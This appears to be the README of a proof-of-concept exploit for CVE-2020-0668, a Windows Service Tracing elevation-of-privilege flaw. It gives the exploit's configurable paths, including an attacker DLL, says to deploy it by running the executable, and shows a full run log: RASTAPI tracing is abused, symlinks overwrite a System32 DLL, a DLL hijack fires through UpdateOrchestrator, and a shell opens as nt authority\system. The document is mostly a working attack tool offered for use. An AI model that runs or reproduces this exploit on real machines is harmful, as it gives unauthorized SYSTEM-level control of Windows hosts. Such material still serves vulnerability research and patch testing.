# CVE-2020-0668

## Windows Service Tracing Elevation of Privilege 

### Options:

1. Exploit Running Location = `LPCWSTR MOUNTPATH = L"C:\\EXPLOIT\\MOUNTPOINT";`  
2. Attacker DLL = `LPCWSTR ATTACKDLLPATH = L"C:\\EXPLOIT\\payload.dll";`

### Deployment:

1. CVE-2020-0668.exe

### Example:

```
C:\EXPLOIT>CVE-2020-0668.exe
[*] Querying RasMan Service
[*] RasMan Service Status: Stopped
[*] Continuing Exploit
[*] Enabling RASTAPI File Tracing
[*] Setting RASTAPI FileDirectory
[*] Setting RASTAPI MaxFileSize
[*] Setting Mount Point
[*] Creating Symlinks
[*] Opened Link \RPC Control\RASTAPI.LOG -> \??\C:\EXPLOIT\payload.dll: 000001C8
[*] Opened Link \RPC Control\RASTAPI.OLD -> \??\C:\Windows\System32\windowscoredeviceinfo.dll: 000001D0
[*] Creating vpn.pbk
[*] Starting Fake VPN Connection
Connecting to VPN...
Verifying username and password...
Connecting to VPN...
Connecting to VPN...
Connecting to VPN...

Remote Access error 800 - The remote connection was not made because the attempted VPN tunnels failed. The VPN server might be unreachable. If this connection is attempting to use an L2TP/IPsec tunnel, the security parameters required for IPsec negotiation might not be configured properly.

For more help on this error:
        Type 'hh netcfg.chm'
        In help, click Troubleshooting, then Error Messages, then 800
[*] Attempting DLL Hijack
[*] Using UpdateOrchestrator->StartScan()
    |__ Creating instance of 'UpdateSessionOrchestrator'... Done.
    |__ Creating a new Update Session... Done.
    |__ Calling 'StartScan'... Done.
[*] Spawning Shell
Microsoft Windows [Version 10.0.18362.418]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```